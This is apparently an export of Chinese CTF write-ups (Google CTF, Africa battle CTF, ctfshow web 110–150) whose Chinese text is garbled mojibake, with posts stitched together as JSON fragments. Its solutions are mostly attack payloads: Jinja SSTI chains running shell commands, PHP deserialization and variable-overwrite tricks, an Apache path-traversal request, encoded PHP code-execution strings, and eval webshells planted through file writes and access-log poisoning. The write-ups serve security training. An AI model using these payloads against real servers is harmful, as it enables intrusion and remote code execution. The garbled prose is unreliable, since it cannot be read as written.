UNDER-CONSTRUCTION\n\nç»™äº†ä¸€ä¸ªflaskå’Œä¸€ä¸ªphpçš„æœåŠ¡ï¼Œæ²¡æœ‰åŠæ³•sstiæ³¨å…¥\n\n~~~php\nfunction getResponse()\n{\n    if (!isset($_POST['username']) || !isset($_POST['password'])) {\n        return NULL;\n    }\n\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n\n    if (!is_string($username) || !is_string($password)) {\n        return \"Please provide username and password as string\";\n    }\n\n    $tier = getUserTier($username, $password);\n\n    if ($tier === NULL) {\n        return \"Invalid credentials\";\n    }\n\n    $response = \"Login successful. Welcome \" . htmlspecialchars($username) . \".\";\n\n    if ($tier === \"gold\") {\n        $response .= \" \" . getenv(\"FLAG\");\n    }\n\n    return $response;\n}\n~~~\n\né€šè¿‡ä»£ç åˆ†æï¼Œåœ¨phpçš„æœåŠ¡ä¸Šï¼Œåªè¦è®©`tier=gold`å°±è¾“å‡ºflagã€‚\n\nå¯ä»¥åœ¨æ³¨å†Œè´¦å·çš„æ—¶å€™ä¼ ä¸¤ä¸ªtierã€‚\n\nflaskè¯†åˆ«ç¬¬ä¸€ä¸ªtierï¼Œphpè¯†åˆ«ç¬¬äºŒä¸ªtierï¼Œæ³¨å†Œå®Œååœ¨phpæœåŠ¡ç™»å½•å¾—åˆ°falgã€‚\n\n\n\n\n\nå…¶ä»–çš„å¤ªéš¾äº†ï¼Œçœ‹éƒ½çœ‹ä¸æ‡‚\n\nhttp://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/\n\nå¯ä»¥çœ‹è¿™ä¸ª\n","tags":["ctf"],"categories":["ctf","å¤ç›˜"]},{"title":"Africa battle CTF","url":"/2023/06/26/Africa-battle-CTF/","content":"\n# WEB\n\n## Civilization\n\n```php\n<?php\nrequire(\"./flag.php\");\nif(isset($_GET['source'])){\n    highlight_file(__FILE__);  \n}\nif(isset($_GET['ami'])){\n    $input = $_GET['ami'];\n    $cigar = 'africacradlecivilization';\n    if (preg_replace(\"/$cigar/\",'',$input) === $cigar) {\n        africa();\n    }\n}\ninclude(\"home.html\");\n?> \n```\n\n?sourceå¾—åˆ°è¿™ä¸ªï¼Œè¿™ä¸ªåªç”¨åŒå†™å°±å¯ä»¥ç»•è¿‡ã€‚\n\npayload:\n\n~~~\n?ami=africacradlecafricacradlecivilizationivilization\n~~~\n\n## Cobalt Injection \t\t\t\t\t\n\nåœ¨æºä»£ç é‡Œæœ‰\n\n`<!-- IP?capital=Benin -->`\n\n![](/pic/Africa/8085.png)\n\nå¯çŸ¥å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥ã€‚æ²¡æœ‰è¿‡æ»¤ã€‚\n\npayload:\n\n~~~\n?capital={{%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat flag.txt').read()}}\n~~~\n\nå½“ç„¶çœ‹åˆ«äººçš„WPï¼Œè¦é•¿è„‘å­äº†\n\n~~~\n?capital={{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}\n~~~\n\n#request.applicationï¼šè¡¨ç¤ºå½“å‰è¯·æ±‚çš„åº”ç”¨ç¨‹åºå¯¹è±¡ã€‚\n\n~~~\n?capital={{().__class__.__base__.__subclasses__()[354]('cat flag.txt', shell=True, stdout=-1).communicate()[0].strip()}}\n~~~\n\nè¿™ä¸ªè¿˜æ²¡ææ˜ç™½ï¼Œææ˜ç™½äº†å†å›æ¥ä¿®æ”¹ã€‚\n\n## FÃ¢\n\nè®¿é—®?source\n\n~~~php\n<?php\n    include(\"flag.php\");\n\n    if(isset($_GET['source'])){\n        highlight_file(__FILE__);\n    }\n    \n    class africa {\n        var $boknn;\n        var $du;\n    }\n   \n    if (isset($_GET['fa'])) {\n        $vodoo = $_GET['fa'];\n       \n        $fa = unserialize($vodoo);\n       \n        if ($fa) {\n            $fa->du=$flag;\n            if ($fa->du === $fa->boknn)\n                echo \"Congratulation! You've got the best interpretation: <b>\".$fa->du.\"</b>\";\n            else\n                echo \"Oh no...\";\n        }\n        else echo \"you dey smoke igbo?\";\n    }\n    include(\"home.html\");\n\n?> \n~~~\n\nååºåˆ—åŒ–ï¼Œåªè¦å°†ä¼ å…¥çš„faå€¼å’Œ$duç›¸ç­‰å°±å¯ä»¥è¾“å‡ºflagã€‚\n\npayload:\n\n~~~\n?fa=O:6:\"africa\":2:{s:5:\"boknn\";N;s:2:\"du\";R:2;}\n~~~\n\nå…¶ä¸­ï¼Œboknnçš„å€¼ä¸ºNULLï¼Œduçš„å€¼é€šè¿‡Rå¼•ç”¨äº†ç¼–å·ä¸º2çš„å€¼ï¼Œ\n\n![](/pic/Africa/8084.png)\n\nboknnçš„ç¼–å·å°±ä¸º2ã€‚\n\nå…·ä½“çš„å¯ä»¥çœ‹:https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html\n\n## Own reality \t\t\t\t\t\n\nçœŸæ˜¯è®©æˆ‘é•¿è§è¯†äº†ã€‚\n\né¦–å…ˆæ˜¯.gitæ³„éœ²\n\nç”¨wgetå°†ç½‘ç«™ä¸‹è½½ä¸‹æ¥\n\n `wget http://chall.battlectf.online:8082/.git/ -mirror\n\nä½¿ç”¨ `--mirror` é€‰é¡¹ä½ å¯ä»¥ä¸‹è½½æ•´ä¸ªç«™ç‚¹ï¼ŒåŒ…æ‹¬å®ƒçš„ç›®å½•ç»“æ„ã€‚\n\nç„¶åç”¨git reflogæŸ¥çœ‹å†å²ç‰ˆæœ¬ï¼Œä¹‹åç”¨git cherry-pick 'ä½ æƒ³è¦æ¢å¤çš„'\n\nä¼šå‡ºæ¥ä¸€ä¸ªflag.txt,å°¾éƒ¨æœ‰\n\n~~~\n.__..._..__...._.___._...___._...__.__...__.._._._....__._._._..._...__..____.__._._._._.__.___..__._.__.__.___..__.____.___.___.__.___.._._____.__..._..__._.._.___._...___..__._._____..__..__..___.....__._...__.._._.__.._._.__...._..__._....___.._.__..._...__._....__..._..__.___.__.._._.__.._._..__.._..__..__..__..__...__._._.__...._..__..._..__..__.__..__..__..._..__.._...__...__.__...__.__...._..__.__..__..__...__..__..__.._...__.___._____._\n~~~\n\näºŒè¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦å°±æ˜¯flag\n\n## It shock you \t\t\t\t\t\n\nå…ˆç”¨whatwebçœ‹ç½‘ç«™ï¼Œ\n\n![](/pic/Africa\\8083.1.png)\n\nå¯ä»¥çœ‹åˆ°apacheçš„ç‰ˆæœ¬ï¼Œå»ç½‘ä¸Šæ‰¾ç›¸å¯¹åº”çš„æ¼æ´èƒ½æ‰¾åˆ°ï¼Œç›®å½•ç©¿è¶Š\n\nPOC:\n\n~~~\n\nGET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt HTTP/1.1\nHost: chall.battlectf.online:8083\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nCookie: PHPSESSID=6ae53a7d294917d5fdac2db41c97b477\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Tue, 06 Jun 2023 14:53:49 GMT\nIf-None-Match: \"b6d-5fd772fd55940\"\n\n~~~\n\n## Africa\n\n`Warning: This site is only for africa people.`\n\nåœ¨bpä¸­å°†`User-Agent`æ”¹ä¸º`africa`\n\n`     Warning: Go away! Attacker! This page is only for local client!`\n\nç”¨`X-Forwarded-For`ä¼ªé€ 127.0.0.1\n\n`Warning: I don't trust users who are not from battlectf.online`\n\nç”¨`Referer`ç»•è¿‡å¾—åˆ°flagã€‚\n\n# Crypto\n\n## Back To Origin\n\nåŸƒåŠè±¡å½¢æ–‡\n\nhttps://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf\n\nå¯ä»¥å‚è€ƒä¸Šé¢çš„é“¾æ¥\n\n## Blind\n\nhttps://gchq.github.io/CyberChef/\n\né¦–å…ˆæ˜¯`magic`è§£ç ï¼Œç„¶å `braille`,è§£ç å¾—åˆ°flag\n\n## ROCYOU\n\n`factordb`å’Œ`yafu`åˆ†è§£ä¸å‡ºæ¥ï¼Œçœ‹åˆ«äººçš„åšå®¢çŸ¥é“æœ‰`ROCAæ¼æ´`ï¼Œå¯ä»¥ä»å…¬é’¥ä¸­æå–ç§é’¥\n\nå·¥å…·ï¼š\n\nhttps://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca\n\nä¸€å¼€å§‹è¿è¡Œè¦ç»™æƒé™\n\n![](/pic/Africa/rock.png)\n\nå¯ä»¥ç”¨åœ¨çº¿çš„rsaè§£å¯†å·¥å…·ï¼šhttps://www.dcode.fr/chiffre-rsa\n\n~~~\np=127801155916875524149457561567678575565270601000365665873572024750823913157383\nq=113917064871970833547038329106470040388258358281464605006613652518914797349747\n~~~\n\n## goose\n\né¦–å…ˆç»™äº†5ä¸ªéšæœºæ•°ï¼Œç„¶åå°†falgçš„æ¯ä¸ªå­—ç¬¦é€šè¿‡`res = (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)`è¿›è¡ŒåŠ å¯†ã€‚\n\nflagçš„å‰å‡ ä¸ªå­—ç¬¦æ˜¯çŸ¥é“çš„ï¼Œå¯ä»¥åˆ—æ–¹ç¨‹ç»„è®¡ç®—ä¸€ä¸‹a,b,c,d,eçš„å€¼\n\n~~~\n184473632*a+941192*b+9604*c+98*d+1*e=1245115057305148164\n177058562*a+912673*b+9409*c+97*d+1*e=1195140205147730541\n362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988\n362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988\n272097792*a+1259712*b+11664*c+108*d+1*e=1835524676869638124\n208120802*a+1030301*b+10201*c+101*d+1*e=1404473868033353193\n~~~\n\nè§£å¾—ï¼š\n\n~~~\na=6709636436\nb=7748795321\nc=7386429784\nd=62359624\ne=5008041292\n~~~\n\nç„¶åå†™ä»£ç çˆ†ç ´:\n\n~~~python\nflag = ''\na=6709636436\nb=7748795321\nc=7386429784\nd=62359624\ne=5008041292\ntab=[1245115057305148164, 1195140205147730541, 2441940832124642988, 2441940832124642988, 1835524676869638124, 1404473868033353193, 272777109172255911, 672752034376118188, 324890781330979572, 3086023531811583439, 475309634185807521, 1195140205147730541, 2441940832124642988, 1578661367846445708, 2358921859155462327, 1099718459319293547, 773945458916291731, 78288818574073053, 2441940832124642988, 1578661367846445708, 1099718459319293547, 343816904985468003, 1195140205147730541, 2527132076695959961, 2358921859155462327, 2358921859155462327, 1099718459319293547, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 3291439457645322417]\n\ndef encrypt(x):\n    return (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)\nfor val in tab:\n    for i in range(32,126):\n        if(encrypt(chr(i))==val):\n            flag+=chr(i)\n            print(flag)\n\n~~~\n\n\n\n# RE\n\n## seyi\n\nida64ä½æ‰“å¼€,flagåœ¨getshellé‡Œé¢ã€‚\n\n## welcome\n\n![](/pic/Africa/welcome.png)\n\né‡ç‚¹å°±æ˜¯è¿™ä¸ªï¼Œ\n\naddå°±æ˜¯åŠ ï¼Œ\n\nxorå°±æ˜¯å¼‚æˆ–ã€‚\n\nå¾ˆç®€å•çš„ä¸€ä¸ªè¡¨è¾¾å¼ã€‚\n\n~~~python\nfrom Crypto.Util.number import *\na = 0x522D1B20F6\nb = 0x1EE2EEEE\nc = a+b\nd = 0x0AA84AAA\nflag = c^d\nflag = long_to_bytes(flag)\nprint(flag)\n~~~\n\n## Infinity\n\n![](/pic/Africa/in.png)\n\næ‰¾åˆ°æ±‡ç¼–ä»£ç é‡Œæ‰€æœ‰çš„pushï¼Œç„¶åå°†å€¼è½¬æ¢ä¸€ä¸‹\n\n~~~python\nfrom pwn import *\na=\t[p64(0x5F4F7572),\n\tp64(0x6C654354),\n\tp64(0x467B4265),\n\tp64(0x796F6E64),\n\tp64(0x62617474),\n\tp64(0x47616C61),\n\tp64(0x7869657D)]\nfor c in a:\n\tprint(c)\n\n~~~\n\n~~~\nb'ruO_\\x00\\x00\\x00\\x00'\nb'TCel\\x00\\x00\\x00\\x00'\nb'eB{F\\x00\\x00\\x00\\x00'\nb'dnoy\\x00\\x00\\x00\\x00'\nb'ttab\\x00\\x00\\x00\\x00'\nb'alaG\\x00\\x00\\x00\\x00'\nb'}eix\\x00\\x00\\x00\\x00'\n~~~\n\nç„¶åå°†è¿™äº›åè½¬ä¸€ä¸‹åˆ æ‰å¤šä½™çš„ä¸œè¥¿\n\n~~~\n_Our\nleCT\nF{Be\nbatt\nGala\nxie}\nyond\n~~~\n\næœ€åå°†è¿™äº›æ‹¼æ¥ä¸€ä¸‹ï¼Œ`battleCTF{Beyond_OurGalaxie} `ã€‚\n\n## babyrev\n\nç”¨idaæ‰“å¼€ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²èƒ½å‘ç°`qpiiatRIU{Pvqp_Ugt3_UDDS_Stn_d0D!_85864r1277qu8195pqqtp6540494pr46}`ï¼Œç„¶åå‡¯æ’’è§£å¯†å¾—åˆ°flag\n\n## checker\n\nå’Œä¸Šä¸€é¢˜åŸºæœ¬ä¸Šå·®ä¸å¤š\n\n`gfyyqjHYK{Flg4_d0z_i3d_xr0p3_1lg0?}`ç„¶åå‡¯æ’’è§£å¯†\n\n","tags":["ctf"],"categories":["ctf","å¤ç›˜"]},{"title":"ctfshow webå…¥é—¨126~150","url":"/2023/03/18/ctfshow-webå…¥é—¨126/","content":"# web126\nä¸web125å·®ä¸å¤š\n~~~\nget: a=1+fl0g=flag_give_me\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\n~~~\n# web127\nç»•è¿‡æ–¹å¼å’Œweb123ä¸€æ ·ã€‚\npayloadï¼š\n~~~\n?ctf show=ilove36d\n~~~\n# web128\n![](/pic/128.png)\nè€ƒå¯Ÿç‚¹ï¼šgettextæ‹“å±•çš„ä½¿ç”¨\nåœ¨å¼€å¯è¯¥æ‹“å±•å _() ç­‰æ•ˆäº gettext()\npayload:\n~~~\n?f1=_&f2=get_defined_vars\n~~~\n# web129\n![](/pic/129.png)\n~~~\nstripos(string,find,start)\nè¿”å›å€¼ï¼šè¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å›FALSEã€‚æ³¨é‡Šï¼šå­—ç¬¦ä¸²ä½ç½®ä»0å¼€å§‹ï¼Œä¸æ˜¯ä»1å¼€å§‹\n~~~\nçœ‹åˆ«äººçš„wpç»•è¿‡çš„å§¿åŠ¿æœ‰å¾ˆå¤šå•Šï¼Œä½†æ˜¯æ€ä¹ˆä¸€åˆ°æˆ‘è¿™é‡Œå°±å¤±çµäº†å•Šã€‚åªèƒ½ç”¨phpä¼ªåè®®\npayload:\n~~~\n?f=php://filter/|ctfshow/resource=flag.php   #ä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„è¿‡æ»¤å™¨\n~~~\n# web130\n![](/pic/130.png)\n[PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)\n~~~\nimport requests\n\nurl='#url'\ndata={\n    'f':'a'*1000000+'ctfshow'\n}\nr=requests.post(url=url,data=data).text\nprint(r)\n~~~\næˆ–è€…\næ•°ç»„ç»•è¿‡\n~~~\nf[]=1   #striposåº”ç”¨äºæ•°ç»„çš„æ—¶å€™ä¼šè¿”å›nullï¼Œnull!==false\n~~~\næˆ–è€…\n~~~\nf=ctfshow\n~~~\n/sæ¨¡å¼ä¸‹ï¼Œ.åŒ¹é…ä»»æ„å­—ç¬¦ï¼Œ+è¡¨ç¤ºé‡å¤ä¸€æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œæ²¡é”™æ˜¯è‡³å°‘ä¸€æ¬¡ï¼è€Œåé¢åŠ ä¸ª?è¡¨ç¤ºæ‡’æƒ°æ¨¡å¼ï¼Œ+?è¡¨ç¤ºé‡å¤1æ¬¡æˆ–æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ã€‚å½“ç„¶æ‡’æƒ°æ¨¡å¼å¹¶ä¸å½±å“è§£é¢˜æ€è·¯ï¼Œæ€»ä¹‹å°±æ˜¯ctfshowå‰é¢å¿…é¡»å¾—æœ‰å­—ç¬¦æ‰èƒ½åŒ¹é…åˆ°ï¼Œæ‰€ä»¥ç›´æ¥f=ctfshowå°±å¯ä»¥äº†ã€‚\n# web131\n~~~\nimport requests\n\nurl='#url'\ndata={\n    'f':'a'*1000000+'36Dctfshow'\n}\nr=requests.post(url=url,data=data).text\nprint(r)\n~~~\n# web132\n![](/pic/132.png)\nä¸€æ‰“å¼€ç½‘ç«™æˆ‘éƒ½æƒŠå‘†äº†ï¼Œå¥½é«˜çº§çš„æ„Ÿè§‰ã€‚ç„¶åè®¿é—®robots.txtæœ‰/adminè®¿é—®å°±èƒ½çœ‹åˆ°æºç ã€‚\n![](/pic/132.1.png)\nå•Š~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nè¿™ä¸€é¢˜å¥½ç®€å•å•Šã€‚\n~~~\n$code === mt_rand(1,0x36D) && $password === $flag\n~~~\nåªè¦è®©è¿™ä¸ªä¸ºfalseï¼Œusername=adminå’Œcode=adminå°±è¡Œ\npayloadï¼š\n~~~\n?username=admin&code=admin&password=1\n~~~\n# web134\n![](/pic/134.png)\nparse_str()å‡½æ•°\n~~~\næŠŠæŸ¥è¯¢å­—ç¬¦è§£æåˆ°å˜é‡\n~~~\nectract()å‡½æ•°\n~~~\nä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥å½“å‰çš„ç¬¦å·è¡¨\n~~~\n~~~\nphpå˜é‡è¦†ç›– åˆ©ç”¨ç‚¹æ˜¯ extract($_POST); è¿›è¡Œè§£æ$_POSTæ•°ç»„ã€‚ å…ˆå°†GETæ–¹æ³•è¯·æ±‚çš„è§£ææˆå˜é‡ï¼Œç„¶ååœ¨åˆ©ç”¨extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚\n~~~\n~~~\nå››ä¸ªå˜é‡çš„ä»‹ç»ï¼š\n\n1.$_SERVER[\"QUERY_STRING\"]\n\nè¯´æ˜ï¼šæŸ¥è¯¢(query)çš„å­—ç¬¦ä¸²\n\n2.$_SERVER[\"REQUEST_URI\"]\n\nè¯´æ˜ï¼šè®¿é—®æ­¤é¡µé¢æ‰€éœ€çš„URI\nã€€ã€€\n3.$_SERVER[\"SCRIPT_NAME\"]\n\nè¯´æ˜ï¼šåŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„\nã€€ã€€\n4.$_SERVER[\"PHP_SELF\"]\n~~~\nä¾‹å¦‚\n~~~\nhttp://www.xxx.com/?p=222 (é™„å¸¦æŸ¥è¯¢)\nç»“æœï¼š\n$_SERVER[\"QUERY_STRING\"]==>â€œp=222â€;\n\n$_SERVER[\"REQUEST_URI\"] ==>\"/?p=222\";\n\n$_SERVER[\"SCRIPT_NAME\"] ==>\"/index.php\";\n\n$_SERVER[\"PHP_SELF\"] ==>\"/index.php\";\n~~~\npayload:\n~~~\n?_POST[key1]=36d&_POST[key2]=36d\n~~~\n# web136\n![](/pic/136.png)\nè·Ÿç€å¤§ä½¬å­¦åˆ°äº†å¥½å¤šå•Š\nåœ¨linuxé‡Œå¯ä»¥ç”¨teeå‘½ä»¤è¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶\npayload:\n~~~\n?c=ls /|tee 1 #æŠŠæ ¹ç›®å½•é‡Œçš„å†…å®¹å†™è¿›1æ–‡ä»¶é‡Œ\n?c=tac /f149_15_h3r3|tee 2\n~~~\n# web137\n![](/pic/137.png)\n~~~\ncall_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨\n~~~\nè€ƒå¯Ÿè°ƒç”¨ç±»ä¸­çš„å‡½æ•°\n~~~\nphpä¸­ ->ä¸:: è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«\n->ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹\n::å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•.\n~~~\npayload:\n~~~\nPOST:ctfshow=ctfshow::getFlag\n~~~\n# web138\n![](/pic/138.png)\nç›¸å½“äºæŠŠå†’å·ç¦ç”¨äº†ï¼Œä½†æ˜¯call_user_funcè¿˜å¯ä»¥ä¼ æ•°ç»„\nç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ç±»åæˆ–è€…ç±»çš„ä¸€ä¸ªå¯¹è±¡ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ç±»çš„æ–¹æ³•åï¼ŒåŒæ ·å¯ä»¥è°ƒç”¨ã€‚\npayload:\n~~~\nPOST:ctfshow[0]=ctfshow&ctfshow[1]=getFlag\n~~~\n# web139\nå¤ªéš¾äº†ï¼Œè„šæœ¬çœ‹ä¸æ‡‚ï¼Œä»¥åæœ‰æœºä¼šäº†å†åš\n# web140\n![](/pic/140.png)\nå¯ä»¥çœ‹åˆ°åªè¦æˆ‘ä»¬è®©intval($code)ä¸º0å°±å¯ä»¥äº†\nintvalä¼šå°†éæ•°å­—å­—ç¬¦è½¬æ¢ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´ intval('a')==0 intval('.')==0 intval('/')==0\næ‰€ä»¥æ–¹æ³•å°±æŒºå¤šäº†\n![](/pic/140.1.png)\npayloadï¼š\n~~~\nf1=chr&f2=chr\n~~~\næˆ‘æ„Ÿè§‰éšä¾¿æä¸€ç‚¹å‡½æ•°æ”¾ä¸Šå»éƒ½å¯ä»¥ã€‚\n# web141\n![](/pic/141.png)\nä¼ å…¥çš„v3å¿…é¡»æ˜¯éå•è¯å­—ç¬¦\n[æ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“ï¼ˆå«ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ã€å¼‚æˆ–ã€æˆ–ã€å–åã€è‡ªå¢è„šæœ¬ï¼‰](https://blog.csdn.net/miuzzx/article/details/109143413)\npayloadï¼š\n~~~\n?v1=1&v2=1&v3=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)-\n~~~\n# web142\n![](/pic/142.png)\nemmmmmmmmmmmmï¼Œè®©æˆ‘å¤ªå¥¶æ¥éƒ½ä¼šåš\npayload:\n~~~\n?v1=0\n~~~\n# web143\n![](/pic/143.png)\n~~~\n?v1=1&v3=*(\"%0c%06%0c%0b%05%0d\"^\"%7f%7f%7f%7f%60%60\")(\"%0b%01%03%00%06%00\"^\"%7f%60%60%20%60%2a\")*&v2=1\n~~~\n# web144\n![](/pic/144.png)\nå¯¹v3çš„é•¿åº¦è¿›è¡Œäº†é™åˆ¶,æ‰€ä»¥åœ¨v2ä¸Šä¸‹æ‰‹\npayload:\n~~~\n?v1=1&v2=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)&v3=1\n~~~\n# web145\n![](/pic/145.png)\nå¯ä»¥ç”¨ä¸‰ç›®è¿ç®—ç¬¦\n~~~\neval(\"return 1?phpinfo():1;\"); #è¿™æ˜¯å¯ä»¥è¿è¡Œçš„\n~~~\npayload:\n~~~\n?v1=1&v2=1&v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):\n~~~\n# web146\nè¿‡æ»¤äº†ï¼šæ²¡åŠæ³•ç”¨ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¯ä»¥ç”¨ç­‰å·å’Œä½è¿ç®—ç¬¦\\\n~~~\neval(\"return 1==phpinfo()||1;\");  #è¿™ä¹Ÿå¯ä»¥è¿è¡Œ\n~~~\npayload:\n~~~\n?v1=1&v2=1&v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)||\n~~~\n# web147\n![](/pic/147.png)\n[å…·ä½“åŸç†çœ‹è¿™ä¸ª](https://paper.seebug.org/755/)\n~~~\ncreate_function('$a','echo $a.\"123\"')\n\nç±»ä¼¼äº\n\nfunction f($a) {\n  echo $a.\"123\";\n}\n~~~\npayload:\n~~~\nGET:?show=}system(\"tac flag.php\");/*\nPOST:ctf=\\create_function\n~~~\n# web148\n![](/pic/148.png)\næ²¡è¿‡æ»¤å¼‚æˆ–è¿˜å¯ä»¥ç”¨å¼‚æˆ–\npayload:\n~~~\n?code=(\"%08%02%08%09%05%0d\"^\"%7b%7b%7b%7d%60%60\")(\"%09%01%03%01%06%0c%01%07%01%0b%08%0b\"^\"%7d%60%60%21%60%60%60%60%2f%7b%60%7b\");\n~~~\n# web149\n![](/pic/149.png)\né¢„æœŸè§£æ˜¯æ¡ä»¶ç«äº‰ï¼Œå¯æ˜¯æˆ‘æäº†åŠå¤©ä¹Ÿä¸è¡Œï¼Œå°±ç›´æ¥åœ¨index.phpé‡Œæ”¹äº†\npayload:\n~~~\nGET: ?ctf=index.php\nPOST: show=<?php @eval($_POST[a];)?>\n~~~\nç„¶åç”¨èšå‰‘è¿æ¥ã€‚\n# web150\n~~~\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#è¿‡æ»¤å­—ç¬¦\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE){\n    include($ctf);\n} \n~~~\néé¢„æœŸ\næ—¥å¿—æ–‡ä»¶åŒ…å«å†™ä¸€å¥è¯\nä¿®æ”¹user_agentå†…å®¹ä¸ºä¸€å¥è¯ï¼Œç„¶ååŒ…å«/var/log/nginx/access.logå°±å¯ä»¥ä½¿ç”¨æˆ‘ä»¬å†™çš„ä¸€å¥è¯äº†ã€‚\né¦–å…ˆè®¿é—®index.php ä¿®æ”¹user_agentä¸º<?php eval($_POST['a']);?>\n![](/pic/150.png)\n\n","tags":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"],"categories":["ctfshow","åˆ·é¢˜","phpç‰¹æ€§"]},{"title":"ctfshow webå…¥é—¨110~125","url":"/2023/03/17/ctfshow-webå…¥é—¨110/","content":"# web110\n![](/pic/110.png)\nè€ƒå¯ŸFilesystemIteratorã€‚getcwd()å‡½æ•° è·å–å½“å‰å·¥ä½œç›®å½• è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚\npayload:\n~~~\n?v1=FilesystemIterator&v2=getcwd\n~~~\nç¼ºé™·æ˜¯å¦‚æœflagçš„æ–‡ä»¶ä¸åœ¨ç¬¬ä¸€ä½çš„è¯ï¼Œå°±ä¸èƒ½å¾—åˆ°è¿™ä¸ªæ–‡ä»¶åã€‚\n<!--more-->\n# web111\n![](/pic/111.png)\nè€ƒå¯Ÿ å…¨å±€å˜é‡GLOBALS\n![](/pic/111.1.png)\nè¦æ‰§è¡Œè¿™ä¸€æ®µå‡½æ•°ï¼Œv1è¦ç­‰äºctfshow\n~~~\nif(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    } \n~~~\nç„¶åå†å°†v2çš„å€¼èµ‹ç»™v1ï¼Œå†æ¥ç€getFlagå‡½æ•°ï¼Œæ‰“å°v1ï¼Œv1ä¸ºå…¨å±€å˜é‡çš„æ—¶å€™ï¼Œå³å¯æ‰“å°å‡ºflagã€‚\npayload:\n~~~\n?v1=ctfshow&v2=GLOBALS\n~~~\n# 